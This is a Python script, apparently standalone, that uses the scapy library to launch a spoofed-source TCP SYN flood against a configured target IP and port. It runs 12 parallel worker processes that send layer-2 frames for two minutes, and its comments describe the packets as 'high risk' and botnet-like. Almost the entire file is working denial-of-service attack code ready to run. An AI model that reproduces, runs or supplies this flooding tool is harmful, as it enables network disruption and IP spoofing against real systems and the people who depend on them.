import sys
import multiprocessing
import time
from scapy.all import Ether, IP, TCP, sendp, RandShort, get_if_hwaddr, conf

# --- CONFIGURATION ---
TARGET_IP = "10.71.36.211" 
SOURCE_IP = "192.168.1.50"
TARGET_PORT = 5173         
PROCESS_COUNT = 12         # Increased for higher push
DURATION = 120  

def aggressive_worker():
    # Get your local MAC address automatically
    local_mac = get_if_hwaddr(conf.iface)
    
    # Constructing a "High Risk" Packet:
    # 1. Layer 2: Ethernet Frame
    # 2. Layer 3: Fixed Spoofed Source IP
    # 3. Layer 4: SYN Flag + Small Window Size (Common in Botnets)
    packet = Ether(src=local_mac) / \
             IP(src=SOURCE_IP, dst=TARGET_IP) / \
             TCP(sport=RandShort(), dport=TARGET_PORT, flags="S", window=64, options=[('MSS', 1460)])
    
    print(f"Aggressive Worker active: {SOURCE_IP} -> {TARGET_IP}")
    
    timeout = time.time() + DURATION
    while time.time() < timeout:
        try:
            # sendp() works at Layer 2 - much faster 'push'
            sendp(packet, verbose=0, realtime=True)
        except Exception as e:
            print(f"Error: {e}")
            break

if __name__ == "__main__":
    try:
        print(f"🚀 Launching LAYER 2 HIGH-RISK SYN FLOOD")
        print(f"Bypassing OS Stack for maximum intensity...")
        
        processes = []
        for _ in range(PROCESS_COUNT):
            p = multiprocessing.Process(target=aggressive_worker)
            p.daemon = True
            p.start()
            processes.append(p)

        for p in processes:
            p.join()

    except KeyboardInterrupt:
        print("\nStopping...")
        sys.exit()